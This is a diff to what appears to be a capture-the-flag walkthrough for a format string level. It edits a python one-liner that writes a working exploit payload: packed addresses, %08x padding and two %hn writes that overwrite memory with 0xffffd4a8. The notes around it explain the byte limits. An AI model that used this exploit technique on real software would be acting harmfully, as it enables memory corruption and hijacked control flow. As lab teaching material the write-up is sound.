@@ -41,7 +41,7 @@
 	```
 	* finally we put our format string attack in a file:
 	```
-	python -c "print('e0970408'.decode('hex') + 'ffffffff'.decode('hex') + 'e2970408'.decode('hex') + '%08x' * 8 + '%054374x' + '%hn' + '%011085x' + '%hn')" > /var/crash/lvl05
+	python -c "print('e0970408'.decode('hex') + 'aaaa' + 'e2970408'.decode('hex') + '%08x' * 8 + '%054374x' + '%hn' + '%011085x' + '%hn')" > /var/crash/lvl05
 	```
 	* as ```0xffffd4a8``` is a big number, we splitted into two ```short``` integers
 	* we also made sure no byte was greater then ```0x40``` or smaller ```0x5b``` as they would have been transformed by the program
